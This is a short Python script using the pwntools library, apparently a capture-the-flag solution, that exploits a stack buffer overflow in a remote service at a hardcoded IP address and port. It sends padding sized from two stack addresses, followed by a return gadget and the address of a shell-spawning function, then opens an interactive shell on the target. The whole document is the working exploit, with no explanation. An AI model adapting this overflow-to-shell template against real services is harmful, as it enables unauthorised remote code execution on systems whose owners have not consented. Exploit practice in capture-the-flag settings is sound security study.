from pwn import *

gets_buf = 0x7fffffffe360
ret_buf = 0x7fffffffe398

ret = 0x400730
sh = 0x400687

r = remote('60.250.197.227', 10000)
r.recvuntil('18.04')
r.sendline('a' * (ret_buf - gets_buf) + p64(ret) + p64(sh))
r.interactive()
